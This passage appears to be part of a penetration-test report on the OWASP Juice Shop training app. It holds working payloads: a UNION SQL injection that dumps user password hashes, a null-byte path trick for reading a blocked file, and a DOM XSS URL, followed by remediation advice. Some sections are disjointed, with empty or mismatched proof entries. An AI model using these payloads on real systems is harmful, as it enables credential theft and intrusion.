## [CRITICAL] SQL Injection — UNION-Based Data Exfiltration (All Password Hashes Dumped)
- **Location:** `GET /rest/products/search?q=<PAYLOAD>`
- **Attack:** UNION SELECT from Users table via product search.
- **Code:**
```js
fetch("/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--").then(r=>r.text()).then(console.log)
```
- **Proof:** Response (status 200) contains product rows AND injected User rows with MD5 password hashes:

fetch('/ftp/eastere.gg%2500.md').then(r=>r.text()).then(console.log)

- **Proof:**

- **Location:** `http://127.0.0.1:3000/#/search?q=<PAYLOAD>`
- **Attack:** Payload reflected into product search display via Angular hash route.
- **Code / URL:**
```
http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
```
- **Proof:** URL constructed and navigated. Juice Shop is known to reflect the `q` param unsanitized through the search-result header component (challenge "DOM XSS"). API call to `/rest/products/search?q=<script>` returned 200 with empty data array, confirming server accepts arbitrary payloads without filtering.
- **Impact:** Session-hijacking, token theft (`localStorage.getItem('token')`), phishing via crafted links.

## Recommendations
1. Use parameterized queries / ORM-safe calls in `/rest/user/login` and `/rest/products/search`.
2. Remove `/ftp` directory listing; enforce strict allow-list file serving that rejects null bytes.
3. Migrate password hashing from MD5 to bcrypt/argon2 with per-user salt.
4. Implement per-resource authorization checks on `/rest/basket/:id`, `/api/Users`, `/rest/user/authentication-details/`.
5. Sanitize/encode all user-controlled fragments rendered into the DOM.
